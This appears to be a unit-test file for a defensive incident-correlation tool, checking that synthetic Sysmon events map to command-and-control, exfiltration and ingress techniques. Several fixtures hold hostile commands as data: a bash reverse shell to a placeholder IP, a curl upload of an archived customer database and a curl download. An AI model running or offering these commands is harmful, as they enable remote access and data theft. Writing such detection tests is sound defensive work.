import unittest
from bluekit.ir.correlator import correlate_incident
from bluekit.kb.query import KB

def proc(ts, host, name, cmd, parent='explorer.exe', dst=None, user='corp\\u1'):
    e = {'@timestamp': ts, 'host': {'name': host}, 'user': {'name': user}, 'event': {'code': '1'},
         'winlog': {'channel': 'Microsoft-Windows-Sysmon/Operational'},
         'process': {'name': name, 'command_line': cmd, 'parent': {'name': parent}}, 'message': ''}
    if dst: e['destination'] = {'ip': dst}
    return e

def net(ts, host, name, dst, src='10.50.1.27', port='443'):
    return {'@timestamp': ts, 'host': {'name': host}, 'user': {'name': 'corp\\u1'}, 'event': {'code': '3'},
            'winlog': {'channel': 'Microsoft-Windows-Sysmon/Operational'}, 'process': {'name': name},
            'source': {'ip': src}, 'destination': {'ip': dst, 'port': port}, 'message': ''}

class TestIrIocPivot(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.kb = KB()

    def test_rat_to_lure_ip_is_c2(self):
        events = [
            proc('2026-10-05T04:00:00Z', 'ACC-PC07', 'msedge.exe', 'msedge.exe hxxps://billing-check.example/invoice', dst='198.51.100.31'),
            net('2026-10-05T05:00:03Z', 'ACC-PC07', 'update.exe', '198.51.100.31')
        ]
        chain = correlate_incident(events, self.kb, heuristic_fallback=False)
        stages = [s for s in chain.stages if s.technique_id == 'T1071.001']
        self.assertEqual(len(stages), 1)
        self.assertEqual(stages[0].iocs['dst_ip'], '198.51.100.31')

    def test_connection_before_ioc_not_flagged(self):
        events = [
            net('2026-10-05T03:00:00Z', 'ACC-PC07', 'update.exe', '198.51.100.31'),
            proc('2026-10-05T04:00:00Z', 'ACC-PC07', 'msedge.exe', 'msedge.exe hxxps://billing-check.example/invoice', dst='198.51.100.31')
        ]
        chain = correlate_incident(events, self.kb, heuristic_fallback=False)
        stages = [s for s in chain.stages if s.technique_id == 'T1071.001']
        self.assertEqual(len(stages), 0)

    def test_unrelated_external_ip_not_flagged(self):
        events = [
            proc('2026-10-05T04:00:00Z', 'ACC-PC07', 'msedge.exe', 'msedge.exe hxxps://billing-check.example/invoice', dst='198.51.100.31'),
            net('2026-10-05T05:00:03Z', 'ACC-PC07', 'update.exe', '203.0.113.200')
        ]
        chain = correlate_incident(events, self.kb, heuristic_fallback=False)
        stages = [s for s in chain.stages if s.technique_id == 'T1071.001']
        self.assertEqual(len(stages), 0)

    def test_curl_after_archive_is_exfil(self):
        events = [
            proc('2026-10-05T04:00:00Z', 'WEB-02', 'bash', 'bash -i >& /dev/tcp/203.0.113.44/4444 0>&1', parent='php-fpm'),
            proc('2026-10-05T05:40:05Z', 'WEB-02', 'tar', 'tar -czf /tmp/customer_export.tgz /tmp/customers.sql'),
            net('2026-10-05T06:00:06Z', 'WEB-02', 'curl', '203.0.113.44', src='10.51.1.12')
        ]
        chain = correlate_incident(events, self.kb, heuristic_fallback=False)
        stages = [s for s in chain.stages if s.technique_id == 'T1041']
        self.assertEqual(len(stages), 1)

    def test_curl_upload_flag_is_exfil(self):
        events = [
            proc('2026-10-05T04:00:00Z', 'WEB-02', 'bash', 'bash -i >& /dev/tcp/203.0.113.44/4444 0>&1', parent='php-fpm'),
            proc('2026-10-05T06:00:06Z', 'WEB-02', 'curl', 'curl -T /tmp/a.tgz http://203.0.113.44/up', dst='203.0.113.44')
        ]
        chain = correlate_incident(events, self.kb, heuristic_fallback=False)
        stages = [s for s in chain.stages if s.technique_id == 'T1041']
        self.assertEqual(len(stages), 1)

    def test_curl_download_is_ingress(self):
        events = [
            proc('2026-10-05T04:00:00Z', 'WEB-02', 'bash', 'bash -i >& /dev/tcp/203.0.113.44/4444 0>&1', parent='php-fpm'),
            proc('2026-10-05T06:00:06Z', 'WEB-02', 'curl', 'curl -o /tmp/x http://203.0.113.44/x', dst='203.0.113.44')
        ]
        chain = correlate_incident(events, self.kb, heuristic_fallback=False)
        stages = [s for s in chain.stages if s.technique_id == 'T1041']
        self.assertEqual(len(stages), 0)
        stages_1105 = [s for s in chain.stages if s.technique_id == 'T1105']
        self.assertGreaterEqual(len(stages_1105), 1)

    def test_c2_aggregated(self):
        events = [
            proc('2026-10-05T04:00:00Z', 'ACC-PC07', 'msedge.exe', 'msedge.exe hxxps://billing-check.example/invoice', dst='198.51.100.31'),
            net('2026-10-05T05:00:03Z', 'ACC-PC07', 'update.exe', '198.51.100.31'),
            net('2026-10-05T05:01:03Z', 'ACC-PC07', 'update.exe', '198.51.100.31'),
            net('2026-10-05T05:02:03Z', 'ACC-PC07', 'update.exe', '198.51.100.31'),
            net('2026-10-05T05:03:03Z', 'ACC-PC07', 'update.exe', '198.51.100.31'),
            net('2026-10-05T05:04:03Z', 'ACC-PC07', 'update.exe', '198.51.100.31')
        ]
        chain = correlate_incident(events, self.kb, heuristic_fallback=False)
        stages = [s for s in chain.stages if s.technique_id == 'T1071.001']
        self.assertEqual(len(stages), 1)
        self.assertEqual(stages[0].iocs.get('connections', 0), 5)

    def test_powershell_external_connection(self):
        events = [
            net('2026-10-05T06:20:07Z', 'APP-01', 'powershell.exe', '198.51.100.116', src='10.55.2.31')
        ]
        chain = correlate_incident(events, self.kb, heuristic_fallback=False)
        stages = [s for s in chain.stages if s.technique_id == 'T1071.001']
        self.assertEqual(len(stages), 1)

        events2 = [
            net('2026-10-05T06:20:07Z', 'APP-01', 'powershell.exe', '10.55.0.5', src='10.55.2.31')
        ]
        chain2 = correlate_incident(events2, self.kb, heuristic_fallback=False)
        stages2 = [s for s in chain2.stages if s.technique_id == 'T1071.001']
        self.assertEqual(len(stages2), 0)

    def test_inbound_not_outbound(self):
        events = [
            proc('2026-10-05T04:00:00Z', 'ACC-PC07', 'msedge.exe', 'msedge.exe hxxps://billing-check.example/invoice', dst='198.51.100.31'),
            net('2026-10-05T05:00:03Z', 'ACC-PC07', 'update.exe', '10.50.1.27', src='198.51.100.31')
        ]
        chain = correlate_incident(events, self.kb, heuristic_fallback=False)
        stages = [s for s in chain.stages if s.technique_id == 'T1071.001']
        self.assertEqual(len(stages), 0)

if __name__ == '__main__':
    unittest.main()
